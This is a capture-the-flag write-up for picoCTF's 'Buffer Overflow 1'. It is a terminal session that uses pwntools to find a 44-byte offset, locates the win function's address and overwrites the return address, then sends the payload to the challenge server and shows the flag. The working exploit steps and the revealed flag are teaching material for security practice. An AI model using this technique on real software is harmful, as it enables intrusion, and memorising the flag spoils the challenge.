# Buffer Overflow 1

# Descripción
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/187/vuln).You can view source [here](https://artifacts.picoctf.net/c/187/vuln.c). And connect with it using `nc saturn.picoctf.net 60597`
# Pistas
Make sure you consider big Endian vs small Endian.

Changing the address of the return pointer can call different functions.
# Solución

```bash
┌──(kali㉿kali)-[~/SegRedySis]
└─$ chmod +x vuln
┌──(kali㉿kali)-[~/SegRedySis]
└─$ echo 'aaaaaaaaaaaaaaaa' | ./vuln                                                                
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
┌──(kali㉿kali)-[~/SegRedySis]
└─$ python          
Python 3.8.13 (default, Mar 28 2022, 11:38:47) 
[GCC 7.5.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> exit()

┌──(kali㉿kali)-[~/SegRedySis]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln

┌──(kali㉿kali)-[~/SegRedySis]
└─$ python
Python 3.8.13 (default, Mar 28 2022, 11:38:47) 
[GCC 7.5.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic_find(0x6161616c)
44
>>> 'E'*44
'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'
>>> exit()

┌──(kali㉿kali)-[~/SegRedySis]
└─$ objdump -D vuln -M intel | grep 'win' 
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>

┌──(kali㉿kali)-[~/SegRedySis]
└─$ python
Python 3.8.13 (default, Mar 28 2022, 11:38:47) 
[GCC 7.5.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
exit()

┌──(kali㉿kali)-[~/SegRedySis]
└─$ echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.

┌──(kali㉿kali)-[~/SegRedySis]
└─$ touch flag.txt                                                                                                        

┌──(kali㉿kali)-[~/SegRedySis]
└─$ echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
d@*���=���d�<����EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE�EEEEEEEEEEEEzsh: done                echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln

┌──(kali㉿kali)-[~/SegRedySis]
└─$ echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | nc saturn.picoctf.net 57864
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f} 

```

# Bandera
picoCTF{addr3ss3s_ar3_3asy_0195a40f} 
